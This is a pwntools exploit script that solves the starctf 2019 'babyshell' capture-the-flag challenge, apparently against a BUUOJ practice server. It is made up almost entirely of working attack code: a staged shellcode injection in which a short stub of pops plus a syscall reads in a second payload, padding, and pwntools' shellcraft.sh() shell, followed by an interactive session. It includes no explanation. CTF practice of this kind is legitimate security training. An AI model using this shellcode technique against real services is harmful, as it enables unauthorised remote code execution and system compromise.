from pwn import *

context(arch='amd64', os='linux', log_level='debug')

file_name = './starctf_2019_babyshell'

debug = 1
if debug:
    r = remote('node4.buuoj.cn',25442)
else:
    r = process(file_name)

elf = ELF(file_name)

def dbg():
    gdb.attach(r)

shellcode = asm('pop rdi;pop rdi;pop rdi;pop rdx;pop rdi;pop rdi;pop rdi;pop rdi;pop rdi;pop rdi;syscall')
r.sendlineafter(' plz:\n',shellcode)

sleep(1)
r.sendline(b'a'*0xC + asm(shellcraft.sh()))

r.interactive()
